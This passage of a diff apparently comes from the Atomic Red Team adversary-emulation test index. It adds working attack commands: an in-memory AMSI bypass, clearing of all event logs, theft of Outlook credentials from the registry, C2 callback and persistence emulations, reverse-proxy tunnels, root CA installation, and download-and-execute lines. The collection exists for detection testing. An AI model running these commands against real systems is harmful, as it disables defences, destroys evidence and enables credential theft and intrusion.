-          Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe "https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1"
-          $file1 = "C:\Users\" + $env:username + "\Downloads\GoToAssist.exe"
-          Start-Process $file1 /S;
-        cleanup_command: try{"$PathToAtomicsFolder/T1219/bin/GoToCleanup.ps1"} catch{}
+        command: 'Start-Process "#{installer_path}" /S;
+
+          '
+        cleanup_command: |
+          Stop-Process -Name "g2ax*" -force
+          $InstalledApp = "GoTo Opener"
+          $Keys = Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall, HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall -ErrorAction SilentlyContinue
+          $Items = $Keys | Get-ItemProperty | where-object {$_.DisplayName -eq $InstalledApp}
+          If ($Items) {
+              $KeyToDelete = $Items.PSPath
+              Remove-Item $KeyToDelete -Recurse -Force -ErrorAction SilentlyContinue
+          }
+
+          Remove-Item -Path "HKCU:\Software\LogMeInInc\GoTo*" -Recurse -Force -ErrorAction SilentlyContinue
+          Remove-Item -Path "HKCU:\Software\Microsoft\Installer\Products\0DFBD403713E24D4FA13BECFB6B96E3E" -Recurse -Force -ErrorAction SilentlyContinue
+          Get-ChildItem "C:\Users\*\AppData\Local" "GoTo Opener" -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+          $Directory = $_.ToString()
+          Remove-Item $Directory -Recurse -Force -ErrorAction SilentlyContinue
+          }
+          Get-ChildItem "C:\Users\*\AppData\Local" "GoToAssist Remote Support Expert" -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+          $Directory = $_.ToString()
+          Remove-Item $Directory -Recurse -Force -ErrorAction SilentlyContinue
+          }
+          Start-Process -FilePath "C:\Program Files (x86)\GoToAssist Remote Support Expert\1702\g2ax_uninstaller_expert.exe" -ArgumentList "/uninstall /silent" -Wait -PassThru | Out-Null
         name: powershell
         elevation_required: true
     - name: ScreenConnect Application Download and Install on Windows
@@ -63246,14 +64865,40 @@ command-and-control:
         will be at the destination location when successfully executed.\n"
       supported_platforms:
       - windows
+      dependencies:
+      - description: 'RustDesk must exist on disk at the specified location (#{installer_path})
+
+          '
+        prereq_command: |
+          if(Test-Path "#{installer_path}") {
+              exit 0
+          } else {
+              exit 1
+          }
+        get_prereq_command: |
+          $parentpath = Split-Path "#{installer_path}"
+          New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null
+          Invoke-WebRequest -Uri #{download_url} -OutFile "#{installer_path}"
+      input_arguments:
+        installer_path:
+          description: where the installer will be downloaded to or already is located
+          type: path
+          default: PathToAtomicsFolder\..\ExternalPayloads\rustdesk-1.2.3-1-x86_64.exe
+        download_url:
+          description: url to download teamviewer from
+          type: url
+          default: https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe
       executor:
-        command: |-
-          $file = Join-Path $env:USERPROFILE "Desktop\rustdesk-1.2.3-1-x86_64.exe"
-          Invoke-WebRequest  -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe
-          Start-Process -FilePath $file "/S"
+        command: Start-Process "#{installer_path}" /S;
         cleanup_command: |-
-          $file = Join-Path $env:USERPROFILE "Desktop\rustdesk-1.2.3-1-x86_64.exe"
-          Remove-Item $file1 -ErrorAction Ignore
+          Stop-Process -Name "rustdesk" -Force
+          Remove-Item "#{installer_path}" -ErrorAction Ignore
+          Get-ChildItem "C:\Users\*\AppData\Local" "rustdesk" -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+          $Directory = $_.ToString()
+          Remove-Item $Directory -Recurse -Force -ErrorAction SilentlyContinue
+          }
+
+          Remove-Item "C:\ProgramData\RustDesk" -Recurse -Force -ErrorAction SilentlyContinue
         name: powershell
     - name: Splashtop Execution
       auto_generated_guid: b025c580-029e-4023-888d-a42710d76934
@@ -63971,6 +65616,101 @@ command-and-control:
           pkill -9 $(basename "#{binary_path}")
           rm -f "#{binary_path}"
         name: sh
+    - name: Install and Run frpc Reverse Proxy Client
+      auto_generated_guid: f54179ee-c782-4fe3-b836-213d3bda66a2
+      description: |
+        Downloads and runs frpc (fast reverse proxy client), the victim-side component
+        of the frp framework. Adversaries deploy frpc on compromised hosts to establish
+        outbound tunnel connections to an attacker-controlled frps server, bypassing
+        inbound firewall rules and exposing internal services externally.
+      supported_platforms:
+      - linux
+      input_arguments:
+        remote_url:
+          description: URL to download the frp release archive
+          type: url
+          default: https://github.com/fatedier/frp/releases/download/v0.71.0/frp_0.71.0_linux_amd64.tar.gz
+        frp_path:
+          description: Path to extract the frp archive
+          type: path
+          default: PathToAtomicsFolder/../ExternalPayloads/frp
+        server_addr:
+          description: Address of the frps server to connect to
+          type: string
+          default: 127.0.0.1
+        server_port:
+          description: Port of the frps server to connect to
+          type: integer
+          default: 7000
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'frpc binary must exist at #{frp_path}/frpc
+
+          '
+        prereq_command: 'test -f #{frp_path}/frpc
+
+          '
+        get_prereq_command: |
+          mkdir -p #{frp_path}
+          curl -L "#{remote_url}" -o "#{frp_path}/frp.tar.gz"
+          tar -xzf "#{frp_path}/frp.tar.gz" --strip-components 1 -C "#{frp_path}"
+          rm -f "#{frp_path}/frp.tar.gz"
+      executor:
+        name: sh
+        elevation_required: false
+        command: |
+          sed -i "s/^serverAddr = .*/serverAddr = \"#{server_addr}\"/" #{frp_path}/frpc.toml
+          sed -i "s/^serverPort = .*/serverPort = #{server_port}/" #{frp_path}/frpc.toml
+          nohup #{frp_path}/frpc -c #{frp_path}/frpc.toml >/dev/null 2>&1 &
+        cleanup_command: |
+          pkill frpc
+          rm -rf #{frp_path}
+    - name: Install and Run gost Tunnel Proxy
+      auto_generated_guid: 3afc90c4-90b3-44af-8d14-52852abe7258
+      description: |
+        Downloads and runs gost (Go Simple Tunnel), a multi-protocol proxy and tunnel
+        tool used by adversaries to establish SOCKS5 proxies, protocol relays, and
+        encrypted tunnels on compromised hosts to facilitate C2 communication and
+        lateral movement while evading network controls.
+      supported_platforms:
+      - linux
+      input_arguments:
+        remote_url:
+          description: URL to download the gost release archive
+          type: url
+          default: https://github.com/go-gost/gost/releases/download/v3.2.6/gost_3.2.6_linux_amd64.tar.gz
+        gost_path:
+          description: Path to store the gost binary
+          type: path
+          default: PathToAtomicsFolder/../ExternalPayloads/gost
+        listen_port:
+          description: Local port for the SOCKS5 proxy listener
+          type: integer
+          default: 1080
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'gost binary must exist at #{gost_path}/gost
+
+          '
+        prereq_command: 'test -f #{gost_path}/gost
+
+          '
+        get_prereq_command: |
+          mkdir -p #{gost_path}
+          curl -L "#{remote_url}" -o "#{gost_path}/gost.tar.gz"
+          tar -xzf "#{gost_path}/gost.tar.gz" -C "#{gost_path}"
+          rm -f "#{gost_path}/gost.tar.gz"
+          chmod +x #{gost_path}/gost
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'nohup #{gost_path}/gost -L socks5://:#{listen_port} >/dev/null 2>&1
+          &
+
+          '
+        cleanup_command: |
+          pkill gost
+          rm -rf #{gost_path}
   T1071.003:
     technique:
       type: attack-pattern
@@ -65345,6 +67085,52 @@ command-and-control:
           Interface> --destination_ip <ATTACKER-IP>\n  \n4. Cleanup Command: Remove
           the icmpdoor directory.\n\n    rm -rf /tmp/icmpdoor\n"
         name: manual
+    - name: Turla Topinambour TCP Callback via Inline .NET
+      auto_generated_guid: b2858526-001a-4b94-8036-d18dab2898a6
+      description: |
+        Attempts a TCP socket connection to a specified IP on port 13277 with a .NET payload, mirroring how Topinambour connects to hardcoded C2 addresses to establish a remote shell.
+        Defaults to 127.0.0.1 so the attempt fails safely without a listener. The socket has a 5 second connection
+        timeout via Poll, and a 20 second receive timeout.
+
+        Reference: https://securelist.com/turla-renews-its-arsenal-with-topinambour/91687/
+      supported_platforms:
+      - windows
+      input_arguments:
+        callback_ip:
+          description: IP address to connect back to (simulates C2 server)
+          type: string
+          default: 127.0.0.1
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $callbackIP = "#{callback_ip}"
+          Add-Type @"
+          using System;
+          using System.Net;
+          using System.Net.Sockets;
+
+          public class TopinambourCallback {
+              public static void Connect(string ip) {
+                  IPAddress addr = IPAddress.Parse(ip);
+                  IPEndPoint remoteEP = new IPEndPoint(addr, 13277);
+                  Socket socket = new Socket(addr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+                  socket.ReceiveTimeout = 20000;
+                  socket.SendTimeout = 60000;
+                  socket.Blocking = false;
+                  try { socket.Connect(remoteEP); } catch (SocketException) { }
+                  if (!socket.Poll(5000000, SelectMode.SelectWrite)) {
+                      socket.Close();
+                      return;
+                  }
+                  socket.Blocking = true;
+                  byte[] array = new byte[4];
+                  socket.Receive(array, 4, SocketFlags.None);
+                  socket.Close();
+              }
+          }
+          "@
+          try { [TopinambourCallback]::Connect($callbackIP) } catch { }
   T1001.003:
     technique:
       type: attack-pattern
@@ -74456,22 +76242,24 @@ lateral-movement:
       x_mitre_version: '1.4'
       identifier: T1021.001
     atomic_tests:
-    - name: RDP to DomainController
+    - name: RDP to Remote Host
       auto_generated_guid: 355d4632-8cb9-449d-91ce-b566d0253d3e
-      description: 'Attempt an RDP session via Remote Desktop Application to a DomainController.
+      description: 'Attempt an RDP session via the Remote Desktop Client (mstsc) to
+        an arbitrary remote host.
 
         '
       supported_platforms:
       - windows
       input_arguments:
-        logonserver:
-          description: ComputerName argument default %logonserver%
+        target_host:
+          description: IP address or hostname of the remote host to RDP into.
           type: string
-          default: $ENV:logonserver.TrimStart("\")
+          default: 127.0.0.1
         domain:
-          description: domain argument default %USERDOMAIN%
+          description: Domain of the account. Leave blank to use a local account (username
+            only).
           type: string
-          default: "$Env:USERDOMAIN"
+          default: ''
         username:
           description: Username argument default %username%
           type: string
@@ -74480,29 +76268,18 @@ lateral-movement:
           description: Password
           type: string
           default: 1password2!
-      dependencies:
-      - description: 'Computer must be domain joined
-
-          '
-        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
-          { exit 0} else { exit 1}
-
-          '
-        get_prereq_command: 'Write-Host Joining this computer to a domain must be
-          done manually
-
-          '
       executor:
         command: |
-          $Server=#{logonserver}
-          $User = Join-Path #{domain} #{username}
-          $Password="#{password}"
+          $Server = "#{target_host}"
+          $User = if ("#{domain}") { "#{domain}\#{username}" } else { "#{username}" }
+          $Password = "#{password}"
           cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
           mstsc /v:$Server
-          echo "RDP connection established"
+          echo "RDP connection attempted"
         cleanup_command: |
           $p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
           if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
+          cmdkey /delete:TERMSRV/#{target_host}| Out-Null
         name: powershell
     - name: Changing RDP Port to Non Standard Port via Powershell
       auto_generated_guid: 2f840dd4-8a2e-4f44-beb3-6b2399ea3771
@@ -76230,7 +78007,7 @@ defense-impairment:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.623Z'
-      name: Windows Host Firewall
+      name: 'Disable or Modify System Firewall: Windows Host Firewall'
       description: "Adversaries may disable or modify the Windows host firewall to
         bypass controls limiting network usage. This can include disabling the Windows
         host firewall entirely, suppressing specific profiles (domain, private, public),
@@ -76256,7 +78033,99 @@ defense-impairment:
       x_mitre_platforms:
       - Windows
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1686.003
+    atomic_tests:
+    - name: Enable Firewall Rule Group via COM Object (HNetCfg.FwPolicy2)
+      auto_generated_guid: 0ef45922-1cd8-4211-8595-3cb3bd87f5d8
+      description: |
+        Uses the HNetCfg.FwPolicy2 COM object to enable the File and Printer Sharing and
+        Network Discovery firewall rule groups on the Private profile. This mirrors behavior
+        observed in ApolloShadow malware, which enables these rule groups to facilitate
+        lateral movement by making the host discoverable and enabling file sharing.
+
+        Reference: https://www.microsoft.com/en-us/security/blog/2025/07/31/frozen-in-transit-secret-blizzards-aitm-campaign-against-diplomats/
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Back up current firewall rule group state for cleanup
+
+          '
+        prereq_command: 'if (Test-Path "$env:TEMP\T1686.003_firewall_backup.txt")
+          {exit 0} else {exit 1}
+
+          '
+        get_prereq_command: |
+          $fw = New-Object -ComObject HNetCfg.FwPolicy2
+          $groups = @("File and Printer Sharing", "Network Discovery")
+          $groups | ForEach-Object {
+              "$_=$($fw.IsRuleGroupEnabled(2, $_))" | Out-File -Append "$env:TEMP\T1686.003_firewall_backup.txt"
+          }
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $fw = New-Object -ComObject HNetCfg.FwPolicy2
+          $fw.EnableRuleGroup(2, "File and Printer Sharing", $true)
+          $fw.EnableRuleGroup(2, "Network Discovery", $true)
+        cleanup_command: |
+          $backupFile = "$env:TEMP\T1686.003_firewall_backup.txt"
+          if (Test-Path $backupFile) {
+              Get-Content $backupFile | ForEach-Object {
+                  $parts = $_ -split '='
+                  $group = $parts[0]
+                  $wasEnabled = [System.Convert]::ToBoolean($parts[1])
+                  $fw = New-Object -ComObject HNetCfg.FwPolicy2
+                  $fw.EnableRuleGroup(2, $group, $wasEnabled)
+              }
+              Remove-Item $backupFile
+          }
+    - name: Set All Network Profiles to Private via Registry
+      auto_generated_guid: f4e1a3bf-8b50-4967-a225-b6c383019e07
+      description: |
+        Modifies the Category value under each network profile GUID in
+        HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles to 0 (Private).
+        This relaxes Windows Firewall rules and enables file sharing, a technique used by
+        ApolloShadow to reduce lateral movement difficulty. Only profiles not already set to
+        Private are modified, and their original values are saved to a backup file for cleanup.
+
+        Reference: https://www.microsoft.com/en-us/security/blog/2025/07/31/frozen-in-transit-secret-blizzards-aitm-campaign-against-diplomats/
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Back up current network profile Category values for cleanup
+
+          '
+        prereq_command: 'if (Test-Path "$env:TEMP\network_profile_backup.txt") {exit
+          0} else {exit 1}
+
+          '
+        get_prereq_command: |
+          $profilesPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles"
+          Remove-Item "$env:TEMP\network_profile_backup.txt" -ErrorAction SilentlyContinue
+          Get-ChildItem $profilesPath | ForEach-Object {
+              $category = (Get-ItemProperty $_.PSPath).Category
+              "$($_.PSChildName)=$category" | Out-File -Append "$env:TEMP\network_profile_backup.txt"
+          }
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $profilesPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles"
+          Get-ChildItem $profilesPath | ForEach-Object {
+              Set-ItemProperty $_.PSPath -Name Category -Value 0
+          }
+        cleanup_command: |
+          $backupFile = "$env:TEMP\network_profile_backup.txt"
+          if (Test-Path $backupFile) {
+              Get-Content $backupFile | ForEach-Object {
+                  $parts = $_ -split '='
+                  $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\$($parts[0])"
+                  Set-ItemProperty $path -Name Category -Value ([int]$parts[1])
+              }
+              Remove-Item $backupFile
+          }
   T1689:
     technique:
       type: attack-pattern
@@ -79987,6 +81856,94 @@ defense-impairment:
           reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\#{app_name}" /t REG_SZ /d "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" /f
         name: command_prompt
         elevation_required: true
+    - name: Turla Mosquito - Store Backdoor Path in OneDriveUpdate Registry Key
+      auto_generated_guid: b6a03947-452c-4137-afaa-112b3c924fd6
+      description: |
+        Emulates the registry-storing behavior of Turla's Mosquito backdoor. Mosquito records its components in the registry key HKCU\Software\Microsoft\Windows\OneDriveUpdate
+        so its loader can reassemble the chain at runtime. It writes:
+
+          1. The name of the original (legitimately hijacked) DLL, tagged with the CLSID, into an
+             "explorer.exe" value under the OneDriveUpdate key.
+          2. The path to the main backdoor into the default value of the same OneDriveUpdate key.
+
+        Mosquito disguises its backdoor as an Adobe Acrobat support file (AdobeSysFnt09.pdb). This test
+        only writes the registry values referencing that IOC-matching file path and hijacked DLL name.
+
+        Reference: https://www.welivesecurity.com/wp-content/uploads/2018/05/ESET_Turla_Mosquito.pdf
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Back up any pre-existing OneDriveUpdate registry key so its
+          original values can be restored during cleanup.
+
+          '
+        prereq_command: |
+          $backupFile = "$env:TEMP\T1112_mosquito_onedriveupdate_backup.reg"
+          if ((Test-Path $backupFile) -or (-not (Test-Path "HKCU:\Software\Microsoft\Windows\OneDriveUpdate"))) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          $backupFile = "$env:TEMP\T1112_mosquito_onedriveupdate_backup.reg"
+          reg export "HKCU\Software\Microsoft\Windows\OneDriveUpdate" "$backupFile" /y | Out-Null
+      executor:
+        command: |
+          $updateKey = "HKCU:\Software\Microsoft\Windows\OneDriveUpdate"
+          New-Item -Path $updateKey -Force | Out-Null
+          Set-ItemProperty -Path $updateKey -Name 'explorer.exe' -Value '%SystemRoot%\system32\EhStorShell.dll;{d9144dcd-e998-4eca-ab6a-dcd83ccba16d};new'
+          Set-Item -Path $updateKey -Value '%APPDATA%\Adobe\Acrobat\9.0\AdobeSysFnt09.pdb'
+        cleanup_command: |
+          $backupFile = "$env:TEMP\T1112_mosquito_onedriveupdate_backup.reg"
+          $regPath = "HKCU:\Software\Microsoft\Windows\OneDriveUpdate".Replace('HKCU:', 'HKCU')
+          reg delete "$regPath" /f 2>&1 | Out-Null
+          if (Test-Path $backupFile) {
+            reg import "$backupFile" 2>&1 | Out-Null
+            Remove-Item $backupFile -Force -ErrorAction Ignore
+          }
+        name: powershell
+        elevation_required: false
+    - name: Disable UAC remote restrictions via LocalAccountTokenFilterPolicy
+      auto_generated_guid: e8c7c404-b669-4cf9-bafd-fdad89a5bbb1
+      description: |
+        Sets the LocalAccountTokenFilterPolicy registry value to 1 under
+        HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System. This disables UAC
+        remote restrictions (token filtering) so that local administrator accounts receive
+        a full (non-filtered) high-integrity token when authenticating over the network,
+        enabling remote administrative actions such as Pass-the-Hash and remote WMI/SMB
+        admin access.
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Save current LocalAccountTokenFilterPolicy state for cleanup
+          restore.
+
+          '
+        prereq_command: 'if (Test-Path "$env:TEMP\T1112_LATP_backup.txt") { exit 0
+          } else { exit 1 }
+
+          '
+        get_prereq_command: |
+          $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+          $prop = Get-ItemProperty -Path $regPath -Name "LocalAccountTokenFilterPolicy" -ErrorAction SilentlyContinue
+          if ($prop -eq $null) { "notpresent" | Out-File "$env:TEMP\T1112_LATP_backup.txt" } else { $prop.LocalAccountTokenFilterPolicy | Out-File "$env:TEMP\T1112_LATP_backup.txt" }
+      executor:
+        command: 'Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+          -Name "LocalAccountTokenFilterPolicy" -Type DWord -Value 1 -Force
+
+          '
+        cleanup_command: |
+          $backupFile = "$env:TEMP\T1112_LATP_backup.txt"
+          $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+          if (Test-Path $backupFile) {
+            $orig = (Get-Content $backupFile).Trim()
+            if ($orig -eq "notpresent") {
+              Remove-ItemProperty -Path $regPath -Name "LocalAccountTokenFilterPolicy" -Force -ErrorAction Ignore
+            } else {
+              Set-ItemProperty -Path $regPath -Name "LocalAccountTokenFilterPolicy" -Type DWord -Value ([int]$orig) -Force
+            }
+            Remove-Item $backupFile -Force
+          }
+        name: powershell
+        elevation_required: true
   T1484.001:
     technique:
       type: attack-pattern
@@ -80954,6 +82911,21 @@ defense-impairment:
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1685.005\src\T1685.005-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
         name: powershell
+        elevation_required: true
+    - name: BlackCat Ransomware Full Log Clear
+      auto_generated_guid: 83dac837-5685-45ed-b10b-9f047572100b
+      description: 'Emulates the iterative Windows event log clearing behavior of
+        BlackCat ransomware using wevtutil.exe
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        command: 'for /F "tokens=*" %i in (''wevtutil.exe el'') DO wevtutil.exe cl
+          "%i"
+
+          '
+        name: command_prompt
         elevation_required: true
   T1647:
     technique:
@@ -83945,6 +85917,44 @@ defense-impairment:
             -PolicyStore ActiveStore
         cleanup_command: Get-NetQosPolicy -PolicyStore ActiveStore | Where-Object
           { $_.Name -like "*#{net_qos_policy_name}*" } | Remove-NetQosPolicy -Confirm:$false
+    - name: AMSI Bypass - Patching AmsiScanBuffer
+      auto_generated_guid: ff543dd9-4537-458c-b297-c85ae1939e34
+      description: |
+        Patches AmsiScanBuffer in memory using P/Invoke to resolve the function address via
+        GetModuleHandle/GetProcAddress, then overwrites the prologue with instructions that
+        return AMSI_RESULT_CLEAN immediately (mov al, 1; ret).
+
+        Reference: https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Add-Type -MemberDefinition @'
+            [DllImport("kernel32.dll")]
+            public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+            [DllImport("kernel32.dll")]
+            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+            [DllImport("kernel32.dll")]
+            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+          '@ -Name "Win32" -Namespace "AMSI"
+
+          $hAmsi = [AMSI.Win32]::GetModuleHandle("amsi.dll")
+          $addr = [AMSI.Win32]::GetProcAddress($hAmsi, "AmsiScanBuffer")
+
+          $oldProtect = 0
+          if ([IntPtr]::Size -eq 8) {
+            $patch = [byte[]]@(0xB0, 0x01, 0xC3)
+          } else {
+            $patch = [byte[]]@(0xB0, 0x01, 0xC2, 0x18, 0x00)
+          }
+
+          [AMSI.Win32]::VirtualProtect($addr, [UIntPtr]::new($patch.Length), 0x40, [ref]$oldProtect) | Out-Null
+          [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
+          [AMSI.Win32]::VirtualProtect($addr, [UIntPtr]::new($patch.Length), $oldProtect, [ref]$oldProtect) | Out-Null
   T1553.004:
     technique:
       type: attack-pattern
@@ -84171,38 +86181,38 @@ defense-impairment:
         elevation_required: true
     - name: Install root CA on Windows with certutil
       auto_generated_guid: 5fdb1a7a-a93c-4fbe-aa29-ddd9ef94ed1f
-      description: 'Creates a root CA with certutil
-
-        '
+      description: |
+        Installs a root CA certificate into the machine-wide Trusted Root Certification
+        Authorities store using certutil -f -addstore root.
       supported_platforms:
       - windows
       input_arguments:
-        pfx_path:
-          description: Path of the certificate
+        root_cert_path:
+          description: Path to the root CA certificate file
           type: path
-          default: "$env:Temp\\rootCA2.cer"
+          default: "$env:TEMP\\atomic_rootCA.cer"
       dependency_executor_name: powershell
       dependencies:
-      - description: 'Certificate must exist at specified location (#{pfx_path})
+      - description: 'Root CA certificate must be generated
 
           '
-        prereq_command: 'if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }
+        prereq_command: 'if (Test-Path "#{root_cert_path}") {exit 0} else {exit 1}
 
           '
         get_prereq_command: |
-          $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
-          Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
-          Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item
+          $root = New-SelfSignedCertificate -Subject "CN=Atomic Root CA" -CertStoreLocation Cert:\CurrentUser\My -KeyUsage CertSign -TextExtension @("2.5.29.19={critical}{text}ca=TRUE")
+          Export-Certificate -Cert $root -FilePath "#{root_cert_path}" -Type CERT
+          $root.Thumbprint | Out-File "$env:TEMP\T1553.004_rootCA_thumbprint.txt"
+          Remove-Item "Cert:\CurrentUser\My\$($root.Thumbprint)"
       executor:
-        command: 'certutil -addstore my #{pfx_path}
+        command: 'certutil.exe -f -addstore root "#{root_cert_path}"
 
           '
         cleanup_command: |
-          try {
-          $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
-          Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
-          Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
-          } catch { }
+          $rootThumb = Get-Content "$env:TEMP\T1553.004_rootCA_thumbprint.txt" -ErrorAction SilentlyContinue
+          if ($rootThumb) { Get-ChildItem "Cert:\LocalMachine\Root\$rootThumb" -ErrorAction SilentlyContinue | Remove-Item }
+          Remove-Item "#{root_cert_path}" -ErrorAction SilentlyContinue
+          Remove-Item "$env:TEMP\T1553.004_rootCA_thumbprint.txt" -ErrorAction SilentlyContinue
         name: powershell
         elevation_required: true
     - name: Add Root Certificate to CurrentUser Certificate Store
@@ -90058,6 +92068,27 @@ credential-access:
         command: "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndecryptteamviewer
           -consoleoutput -noninteractive  "
         name: powershell
+    - name: Warzone/AveMaria RAT Style Credential Theft via Outlook Registry
+      auto_generated_guid: 4a16a770-c1fc-494a-8131-022a0b147b3a
+      description: 'Emulates behaviors seen in the Warzone/AveMaria RAT, where credentials
+        associated with a user''s Microsoft Outlook profile are stolen through registry
+        access. (https://www.splunk.com/en_us/blog/security/defending-the-gates-understanding-and-detecting-ave-maria-warzone-rat.html)
+
+        '
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $hexId = "9375CFF0413111d3B88A00104B2A6676"
+          Get-ChildItem "HKCU:\Software\Microsoft\Office\*\Profiles\*" -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.PSChildName -eq $hexId } | ForEach-Object{Get-ItemProperty -Path $_.FullName}
+          if(Test-Path -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\$hexId"){
+            Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\$hexId"
+          }
+          if(Test-Path -Path "HKCU:\Software\Microsoft\Windows Messaging Subsystem\Profiles\$hexId"){
+            Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows Messaging Subsystem\Profiles\$hexId"
+          }
   T1552:
     technique:
       type: attack-pattern
@@ -90540,24 +92571,52 @@ credential-access:
       - description: 'Chrome must be installed
 
           '
-        prereq_command: if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe")
+        prereq_command: 'if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe")
           -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"))
           {exit 0} else {exit 1}
+
+          '
         get_prereq_command: |
-          New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-          $installer = "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"
-          Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
-          msiexec /i $installer /qn
-          Start-Process -FilePath "chrome.exe"
+          if (!(Test-Path "#{installer_path}")){
+            $parentpath = Split-Path "#{installer_path}"
+            New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null
+            (New-Object Net.WebClient).DownloadFile("#{download_url}","#{installer_path}")
+          }
+          $path = Convert-Path -LiteralPath "#{installer_path}"
